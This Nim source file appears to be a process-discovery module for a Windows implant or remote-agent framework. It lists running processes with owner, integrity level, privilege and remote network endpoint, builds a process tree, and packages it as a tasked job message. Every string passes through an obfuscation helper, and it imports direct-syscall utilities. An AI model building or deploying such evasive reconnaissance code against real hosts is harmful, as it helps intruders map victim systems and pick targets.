import std/[json, math, strutils, tables]
import ../utils/global
import ../utils/general/strings
import ../utils/winapi/handlers
import ../utils/winapi/syscall
import execution/core

const
  th32CsSnapProcess = 0x00000002'u32
  processQueryInfo = 0x0400'u32
  processVmRead = 0x0010'u32
  tokenQuery = 0x0008'u32
  invalidHandle = cast[pointer](-1)
  pmcCb = 0
  pmcWorkingSet = 16
  pmcSize = 72
  tcpRowSize = 24
  tcpRemoteAddr = 12
  tcpRemotePort = 16
  tcpOwningPid = 20

type
  ProcessEntry32W = object
    dwSize: uint32
    cntUsage: uint32
    th32ProcessID: uint32
    th32DefaultHeapID: uint64
    th32ModuleID: uint32
    cntThreads: uint32
    th32ParentProcessID: uint32
    pcPriClassBase: int32
    dwFlags: uint32
    szExeFile: array[260, uint16]

  SystemInfo = object
    wProcessorArchitecture: uint16
    wReserved: uint16
    dwPageSize: uint32
    lpMinimumApplicationAddress: pointer
    lpMaximumApplicationAddress: pointer
    dwActiveProcessorMask: uint64
    dwNumberOfProcessors: uint32
    dwProcessorType: uint32
    dwAllocationGranularity: uint32
    wProcessorLevel: uint16
    wProcessorRevision: uint16

  FileTime = object
    dwLowDateTime: uint32
    dwHighDateTime: uint32

proc createToolhelp32Snapshot(flags, th32ProcessID: uint32): pointer {.stdcall, importc: "CreateToolhelp32Snapshot", dynlib: "kernel32".}
proc process32FirstW(hSnapshot: pointer; lppe: ptr ProcessEntry32W): int32 {.stdcall, importc: "Process32FirstW", dynlib: "kernel32".}
proc process32NextW(hSnapshot: pointer; lppe: ptr ProcessEntry32W): int32 {.stdcall, importc: "Process32NextW", dynlib: "kernel32".}
proc getSystemInfo(lpSystemInfo: ptr SystemInfo) {.stdcall, importc: "GetSystemInfo", dynlib: "kernel32".}
proc getTickCount64(): uint64 {.stdcall, importc: "GetTickCount64", dynlib: "kernel32".}
proc getProcessTimes(hProcess: pointer; lpCreationTime, lpExitTime, lpKernelTime, lpUserTime: ptr FileTime): int32 {.stdcall, importc: "GetProcessTimes", dynlib: "kernel32".}
proc isWow64Process(hProcess: pointer; wow64Process: ptr int32): int32 {.stdcall, importc: "IsWow64Process", dynlib: "kernel32".}
proc queryFullProcessImageNameW(hProcess: pointer; dwFlags: uint32; lpExeName: pointer; lpdwSize: ptr uint32): int32 {.stdcall, importc: "QueryFullProcessImageNameW", dynlib: "kernel32".}
proc k32GetProcessMemoryInfo(hProcess: pointer; ppsmemCounters: pointer; cb: uint32): int32 {.stdcall, importc: "K32GetProcessMemoryInfo", dynlib: "kernel32".}
proc getExtendedTcpTable(pTcpTable: pointer; pdwSize: ptr uint32; bOrder: int32; ulAf: uint32; tableClass: int32; reserved: uint32): uint32 {.stdcall, importc: "GetExtendedTcpTable", dynlib: "iphlpapi".}

proc getTokenInfo(hProc: pointer): tuple[user, integrity: string, session: int] =
  # Reads the user, integrity, and session from a process token
  result = ("", "", 0)
  var hToken: pointer
  if openProcessToken(hProc, tokenQuery, addr hToken) != 0:
    return
  defer:
    discard ntCloseHandle(hToken)

  proc q(cls: culong): seq[byte] =
    # Queries one token information class into a byte buffer
    var sz: culong = 0
    discard queryInformationToken(hToken, cls, nil, 0, addr sz)
    if sz == 0:
      return @[]
    var data = newSeq[byte](sz.int)
    if queryInformationToken(hToken, cls, addr data[0], sz, addr sz) != 0:
      return @[]
    data

  try:
    let ubuf = q(1)
    if ubuf.len > 0:
      let sid = cast[ptr pointer](addr ubuf[0])[]
      var nb, db: array[256, uint16]
      var nl, dl = culong(256)
      var su: culong = 0
      if lookupAccountSidW(nil, sid, addr nb[0], addr nl, addr db[0], addr dl, addr su) != 0:
        let n = wideToAscii(addr nb[0], culong(nl * 2))
        let d = wideToAscii(addr db[0], culong(dl * 2))
        result.user = if d.len > 0: d & obf("\\") & n else: n
  except CatchableError:
    discard

  try:
    let sbuf = q(12)
    if sbuf.len >= 4:
      result.session = int(cast[ptr uint32](addr sbuf[0])[])
  except CatchableError:
    discard

  try:
    let ibuf = q(25)
    if ibuf.len > 0:
      let pSid = cast[ptr pointer](addr ibuf[0])[]
      let sc = getSidSubAuthorityCount(pSid)
      if sc != nil and sc[] > 0:
        let rid = getSidSubAuthority(pSid, culong(sc[] - 1))
        if rid != nil:
          result.integrity = case rid[]
          of 0x1000'u32: obf("Low")
          of 0x2000'u32: obf("Medium")
          of 0x2100'u32: obf("Medium+")
          of 0x3000'u32: obf("High")
          of 0x4000'u32: obf("System")
          else: obf("Untrusted")
  except CatchableError:
    discard

proc getTcpMap(): Table[uint32, string] =
  # Builds a map from pid to remote tcp endpoint
  var sz: uint32 = 0
  discard getExtendedTcpTable(nil, addr sz, 0, 2, 5, 0)
  if sz == 0:
    return
  var buf = newSeq[byte](sz)
  if getExtendedTcpTable(addr buf[0], addr sz, 0, 2, 5, 0) != 0:
    return
  let num = cast[ptr uint32](addr buf[0])[]
  for i in 0 ..< int(num):
    try:
      let rowBase = cast[int](addr buf[0]) + 4 + i * tcpRowSize
      let remoteAddr = cast[ptr uint32](rowBase + tcpRemoteAddr)[]
      let remotePort = cast[ptr uint32](rowBase + tcpRemotePort)[]
      let pid = cast[ptr uint32](rowBase + tcpOwningPid)[]
      if remoteAddr == 0 or result.hasKey(pid):
        continue
      let ip = $(remoteAddr and 0xFF) & obf(".") &
        $((remoteAddr shr 8) and 0xFF) & obf(".") &
        $((remoteAddr shr 16) and 0xFF) & obf(".") &
        $((remoteAddr shr 24) and 0xFF)
      let port = int((remotePort shr 8) or ((remotePort and 0xFF) shl 8))
      result[pid] = ip & obf(":") & $port
    except CatchableError:
      discard

proc snapshotProcesses(): seq[JsonNode] =
  # Collects a snapshot of the running processes
  var si: SystemInfo
  getSystemInfo(addr si)
  let numCpus = max(1'i64, int64(si.dwNumberOfProcessors))
  let uptime = int64(getTickCount64()) * 10_000'i64
  let tcpMap = getTcpMap()

  let hSnap = createToolhelp32Snapshot(th32CsSnapProcess, 0)
  if hSnap == invalidHandle:
    return @[]
  defer:
    discard closeHandle(hSnap)

  var entry: ProcessEntry32W
  entry.dwSize = uint32(sizeof(ProcessEntry32W))
  if process32FirstW(hSnap, addr entry) == 0:
    return @[]

  while true:
    let pid = entry.th32ProcessID
    if pid != 0:
      try:
        var p = %*{
          obf("pid"): pid,
          obf("ppid"): entry.th32ParentProcessID,
          obf("name"): wideToAscii(addr entry.szExeFile[0], culong(sizeof(entry.szExeFile))),
          obf("path"): obf(""),
          obf("user"): obf(""),
          obf("integrity"): obf(""),
          obf("session"): 0,
          obf("arch"): obf(""),
          obf("network"): if tcpMap.hasKey(pid): tcpMap[pid] else: obf(""),
          obf("privilege"): obf(""),
          obf("cpu"): 0.0,
          obf("memory"): 0.0,
        }

        let hProc = openProcess(culong(pid), processQueryInfo or processVmRead)
        if hProc != nil:
          try:
            var pathBuf: array[1024, uint16]
            var pathLen = uint32(1024)
            if queryFullProcessImageNameW(hProc, 0, addr pathBuf[0], addr pathLen) != 0:
              p[obf("path")] = %wideToAscii(addr pathBuf[0], culong(pathLen * 2))
          except CatchableError:
            discard

          try:
            var memBuf: array[pmcSize, byte]
            cast[ptr uint32](addr memBuf[pmcCb])[] = uint32(pmcSize)
            if k32GetProcessMemoryInfo(hProc, addr memBuf[0], uint32(pmcSize)) != 0:
              let ws = cast[ptr uint](addr memBuf[pmcWorkingSet])[]
              p[obf("memory")] = %(round(float(ws) / 1_048_576.0 * 10.0) / 10.0)
          except CatchableError:
            discard

          try:
            var ct, et, kt, ut: FileTime
            if getProcessTimes(hProc, addr ct, addr et, addr kt, addr ut) != 0:
              let k = (uint64(kt.dwHighDateTime) shl 32) or uint64(kt.dwLowDateTime)
              let u = (uint64(ut.dwHighDateTime) shl 32) or uint64(ut.dwLowDateTime)
              let total = k + u
              let sysTime = uptime * numCpus
              if sysTime > 0 and total <= uint64(high(int64)):
                p[obf("cpu")] = %(round(min(100.0, float(int64(total)) / float(sysTime) * 100.0) * 10.0) / 10.0)
          except CatchableError:
            discard

          try:
            var wow: int32 = 0
            discard isWow64Process(hProc, addr wow)
            p[obf("arch")] = %(if wow != 0: obf("32-bit") else: obf("64-bit"))
          except CatchableError:
            discard

          try:
            let ti = getTokenInfo(hProc)
            p[obf("user")] = %ti.user
            p[obf("integrity")] = %ti.integrity
            p[obf("session")] = %ti.session
            let priv =
              if ti.integrity == obf("System"): obf("system")
              elif ti.integrity == obf("High"): obf("admin")
              else: obf("user")
            p[obf("privilege")] = %priv
          except CatchableError:
            discard

          discard ntCloseHandle(hProc)

        result.add(p)
      except CatchableError:
        discard

    if process32NextW(hSnap, addr entry) == 0:
      break

proc buildTree(procs: seq[JsonNode]): JsonNode =
  # Builds a parent and child tree from the process list
  var pidIdx = initTable[uint32, int]()
  for i, p in procs:
    pidIdx[uint32(p[obf("pid")].getInt())] = i

  var childOf = initTable[int, seq[int]]()
  var isChild = newSeq[bool](procs.len)

  for i, p in procs:
    let pid = uint32(p[obf("pid")].getInt())
    let ppid = uint32(p[obf("ppid")].getInt())
    if ppid != 0 and ppid != pid and pidIdx.hasKey(ppid):
      let par = pidIdx[ppid]
      if not childOf.hasKey(par):
        childOf[par] = @[]
      childOf[par].add(i)
      isChild[i] = true

  proc toJson(idx: int): JsonNode =
    # Builds the json node for one process and its children
    let p = procs[idx]
    result = %*{
      obf("pid"): p[obf("pid")],
      obf("name"): p[obf("name")],
      obf("path"): p[obf("path")],
      obf("cpu"): p[obf("cpu")],
      obf("memory"): p[obf("memory")],
      obf("user"): p[obf("user")],
      obf("integrity"): p[obf("integrity")],
      obf("session"): p[obf("session")],
      obf("arch"): p[obf("arch")],
      obf("network"): p[obf("network")],
      obf("privilege"): p[obf("privilege")],
    }
    if childOf.hasKey(idx) and childOf[idx].len > 0:
      var arr = newJArray()
      for c in childOf[idx]:
        arr.add(toJson(c))
      result[obf("children")] = arr

  var tree = newJArray()
  for i in 0 ..< procs.len:
    if not isChild[i]:
      tree.add(toJson(i))
  tree

proc jobMessage*(host, taskTag, input, params: string): string =
  # Builds the process tree job message
  discard input
  discard params
  try:
    let tree = buildTree(snapshotProcesses())
    $( %*{
      obf("option"): obf("output"),
      obf("type"): obf("process"),
      obf("host"): host,
      obf("task_tag"): taskTag,
      obf("tree"): $tree,
    })
  except CatchableError as e:
    $( %*{
      obf("option"): obf("output"),
      obf("type"): obf("process"),
      obf("host"): host,
      obf("task_tag"): taskTag,
      obf("error"): e.msg,
    })

proc run*(host, taskTag, input, params: string; buf: var openArray[char]): int =
  # Main function that writes the process tree message
  writeMsg(jobMessage(host, taskTag, input, params), buf)
